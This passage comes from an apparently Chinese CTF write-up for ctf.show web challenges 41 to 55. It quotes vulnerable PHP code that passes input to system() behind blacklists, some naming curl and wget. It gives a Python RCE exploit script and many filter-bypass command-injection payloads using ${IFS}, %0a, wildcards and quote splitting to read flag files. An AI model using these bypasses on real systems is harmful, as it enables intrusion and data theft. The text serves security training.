class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>os.system(<span class="hljs-string">&quot;php rce_or.php&quot;</span>)  <span class="hljs-comment">#没有将php写入环境变量需手动运行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(argv)!=<span class="hljs-number">2</span>):<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;USER：python exp.py &lt;url&gt;&#x27;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;eg：  python exp.py http://ctf.show/&quot;</span>)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">50</span>)<br>   exit(<span class="hljs-number">0</span>)<br>url=argv[<span class="hljs-number">1</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rce_or.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your command：&quot;</span>))<br>   data=&#123;<br>       <span class="hljs-string">&#x27;c&#x27;</span>:urllib.parse.unquote(param)<br>       &#125;<br>   r=requests.post(url,data=data)<br>   <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[*] result:\n&quot;</span>+r.text)<br><br></code></pre></td></tr></table></figure><p>用法就是</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> poc.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;url&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ab36673e8f412f92.png"></p><p>url 用 <code>https</code> 会报错，改成 <code>http</code> 就好了</p><h1 id="Web-42"><a href="#Web-42" class="headerlink" title="Web 42"></a>Web 42</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 20:51:55<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>&gt;/dev/null 2&gt;&amp;1</code> 将输入重定向到 <code>/dev/null</code> 中，可以直接注释掉，比如说 <code>%0a</code> 截断，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=cat flag.php%0a<br></code></pre></td></tr></table></figure><p>再查看源代码</p><h1 id="Web-43"><a href="#Web-43" class="headerlink" title="Web 43"></a>Web 43</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:32:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>还是截断，<code>cat</code> 被禁了就用 <code>tac/tail/rev</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-44"><a href="#Web-44" class="headerlink" title="Web 44"></a>Web 44</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:32:01<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>一样的 payload</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-45"><a href="#Web-45" class="headerlink" title="Web 45"></a>Web 45</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:35:34<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| /i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了个空格，用 <code>%90/$&#123;IFS&#125;</code> 代替</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fla*%0a<br>?c=tac$&#123;IFS&#125;fla*%0a<br></code></pre></td></tr></table></figure><h1 id="Web-46"><a href="#Web-46" class="headerlink" title="Web 46"></a>Web 46</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:50:19<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>把通配符 <code>*</code> 也过滤了，数字也过滤了，那就用 <code>?</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fla?.php%0a<br>?c=tac%09????????%0a<br></code></pre></td></tr></table></figure><h1 id="Web-47"><a href="#Web-47" class="headerlink" title="Web 47"></a>Web 47</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 21:59:23<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>虽然过滤了一些和 <code>cat</code> 类似用法的命令，但是还能用 <code>tac/nl</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09????????%0a<br>?c=tac&lt;&gt;fla\g.php||<br>?c=tac&lt;&gt;fla&#x27;&#x27;g.php||<br>?c=nl&lt;&gt;fla&#x27;&#x27;g.php||<br>?c=nl&lt;fla&#x27;&#x27;g.php||<br></code></pre></td></tr></table></figure><h1 id="Web-48"><a href="#Web-48" class="headerlink" title="Web 48"></a>Web 48</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:06:20<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>过滤了一大堆，还是剩下了 <code>tac/nl</code>，payload 差不多</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac%09fl\ag.php||<br>?c=nl%09fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-49"><a href="#Web-49" class="headerlink" title="Web 49"></a>Web 49</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:22:43<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了 <code>%</code>，那么空格就用 <code>&lt;&gt;</code> 代替，截断用 <code>||</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac&lt;&gt;fl\ag.php||<br>?c=nl&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:32:47<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>多过滤了 <code>x09 和 x26</code>，payload 还是一样</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=tac&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-51"><a href="#Web-51" class="headerlink" title="Web 51"></a>Web 51</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:42:52<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br></code></pre></td></tr></table></figure><p>这个把 <code>tac</code> 过滤了，但是还能用 <code>nl</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=nl&lt;&gt;fl\ag.php||<br></code></pre></td></tr></table></figure><h1 id="Web-52"><a href="#Web-52" class="headerlink" title="Web 52"></a>Web 52</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-05 22:50:30<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>把 <code>&lt;&gt;</code> 都过滤了，那就用 <code>$&#123;IFS&#125;</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=ca&#x27;&#x27;t$&#123;IFS&#125;/fl\ag||<br></code></pre></td></tr></table></figure><h1 id="Web-53"><a href="#Web-53" class="headerlink" title="Web 53"></a>Web 53</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 18:21:02<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br><br>if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        echo($c);<br>        $d = system($c);<br>        echo &quot;&lt;br&gt;&quot;.$d;<br>    &#125;else&#123;<br>        echo &#x27;no&#x27;;<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure><p>payload 差不多</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=ca\t$&#123;IFS&#125;fla\g.php<br>?c=ca&#x27;&#x27;t$&#123;IFS&#125;fla&#x27;&#x27;g.php<br></code></pre></td></tr></table></figure><h1 id="Web-54"><a href="#Web-54" class="headerlink" title="Web 54"></a>Web 54</h1><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&lt;?php<br><br>/*<br><span class="hljs-section"># -<span class="hljs-emphasis">*- coding: utf-8 -*</span>-</span><br><span class="hljs-section"># @Author: Lazzaro</span><br><span class="hljs-section"># @Date:   2020-09-05 20:49:30</span><br><span class="hljs-section"># @Last Modified by:   h1xa</span><br><span class="hljs-section"># @Last Modified time: 2020-09-07 19:43:42</span><br><span class="hljs-section"># @email: h1xa@ctfer.com</span><br><span class="hljs-section"># @link: https://ctfer.com</span><br><br><span class="hljs-emphasis">*/</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="hljs-emphasis">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="hljs-emphasis">    if(!preg_match(&quot;/\;|.*</span>c.<span class="hljs-emphasis">*a.*</span>t.<span class="hljs-emphasis">*|.*</span>f.<span class="hljs-emphasis">*l.*</span>a.<span class="hljs-emphasis">*g.*</span>| |[0-9]|\<span class="hljs-emphasis">*|.*</span>m.<span class="hljs-emphasis">*o.*</span>r.<span class="hljs-emphasis">*e.*</span>|.<span class="hljs-emphasis">*w.*</span>g.<span class="hljs-emphasis">*e.*</span>t.<span class="hljs-emphasis">*|.*</span>l.<span class="hljs-emphasis">*e.*</span>s.<span class="hljs-emphasis">*s.*</span>|.<span class="hljs-emphasis">*h.*</span>e.<span class="hljs-emphasis">*a.*</span>d.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*o.*</span>r.<span class="hljs-emphasis">*t.*</span>|.<span class="hljs-emphasis">*t.*</span>a.<span class="hljs-emphasis">*i.*</span>l.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*e.*</span>d.<span class="hljs-emphasis">*|.*</span>c.<span class="hljs-emphasis">*u.*</span>t.<span class="hljs-emphasis">*|.*</span>t.<span class="hljs-emphasis">*a.*</span>c.<span class="hljs-emphasis">*|.*</span>a.<span class="hljs-emphasis">*w.*</span>k.<span class="hljs-emphasis">*|.*</span>s.<span class="hljs-emphasis">*t.*</span>r.<span class="hljs-emphasis">*i.*</span>n.<span class="hljs-emphasis">*g.*</span>s.<span class="hljs-emphasis">*|.*</span>o.<span class="hljs-emphasis">*d.*</span>|.<span class="hljs-emphasis">*c.*</span>u.<span class="hljs-emphasis">*r.*</span>l.<span class="hljs-emphasis">*|.*</span>n.<span class="hljs-emphasis">*l.*</span>|.<span class="hljs-emphasis">*s.*</span>c.<span class="hljs-emphasis">*p.*</span>|.<span class="hljs-emphasis">*r.*</span>m.<span class="hljs-emphasis">*|\`|\%|\x09|\x26|\&gt;|\<span class="language-xml">&lt;/i&quot;, $c))&#123;</span></span><br><span class="language-xml"><span class="hljs-emphasis">        system($c);</span></span><br><span class="language-xml"><span class="hljs-emphasis">    &#125;</span></span><br><span class="language-xml"><span class="hljs-emphasis">&#125;else&#123;</span></span><br><span class="language-xml"><span class="hljs-emphasis">    highlight_file(__FILE__);</span></span><br><span class="language-xml"><span class="hljs-emphasis">&#125;</span></span><br></code></pre></td></tr></table></figure><p>看到题目懵了一下，前面的那些方法已经不行了</p><ol><li><p>把文件复制到当前目录下，然后访问目录下载</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=cp$&#123;IFS&#125;f?ag.php$&#123;IFS&#125;./a<br>./a<br></code></pre></td></tr></table></figure></li><li><p>用通配符匹配 bin 目录下的 cat 或者 tac</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=/bin/ca?$&#123;IFS&#125;f?ag.php<br>?c=/bin/c??$IFS???????? <br></code></pre></td></tr></table></figure></li><li><p>用 <code>grep</code> 查找字符串</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?c=grep$&#123;IFS&#125;&#x27;fla&#x27;$&#123;IFS&#125;fla?.php<br></code></pre></td></tr></table></figure></li></ol><h1 id="Web-55"><a href="#Web-55" class="headerlink" title="Web 55"></a>Web 55</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: Lazzaro<br># @Date:   2020-09-05 20:49:30<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-07 20:03:51<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>// 